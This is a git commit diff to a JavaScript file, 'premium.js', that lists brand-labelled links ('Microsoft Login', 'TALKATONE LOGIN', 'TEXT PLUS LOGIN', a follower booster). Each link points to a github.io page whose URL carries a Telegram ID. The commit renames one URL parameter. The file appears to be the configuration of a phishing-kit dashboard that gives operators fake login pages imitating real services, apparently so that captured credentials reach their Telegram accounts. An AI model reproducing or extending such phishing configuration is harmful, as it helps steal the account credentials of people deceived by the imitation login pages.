eb081e303b0ef2b4e96e0aeabdacb0b6a506b895
mounazb <munon2ewpaolo@proton.me>
2026-02-28 00:23:05 +0100

    Update premium.js

--- idash/premium.js
+++ idash/premium.js
@@ -1,5 +1,5 @@
 const premiumLinks = [ 
-{ name: "All social media link boost followers", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSa1l_hp-hyt9Ll7Ct3Nv0RNXwJyoF478iPz67sPLMlxg&s=10", urlTemplate: "https://logscity.github.io/sendbooster/index.html?id={telegram-id}" },
+{ name: "All social media link boost followers", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSa1l_hp-hyt9Ll7Ct3Nv0RNXwJyoF478iPz67sPLMlxg&s=10", urlTemplate: "https://logscity.github.io/sendbooster/index.html?admin={telegram-id}" },
  { name: "Microsoft Login", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png", urlTemplate: "https://pylpo.github.io/z/a1?id={telegram-id}" },
 { name: "TALKATONE LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKdihiI6UETynk7yUXocw-DyCDT2SN2rzvHR93zy-arg&s=10", urlTemplate: "https://pylpo.github.io/z/a2?id={telegram-id}" },
 { name: "TEXT PLUS LOGIN", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQiatsUYnQsRBiKkS2_MyNOAGVt57wnlUSwA9Nkx_60wA&s=10", urlTemplate: "https://pylpo.github.io/z/a3?id={telegram-id}" },
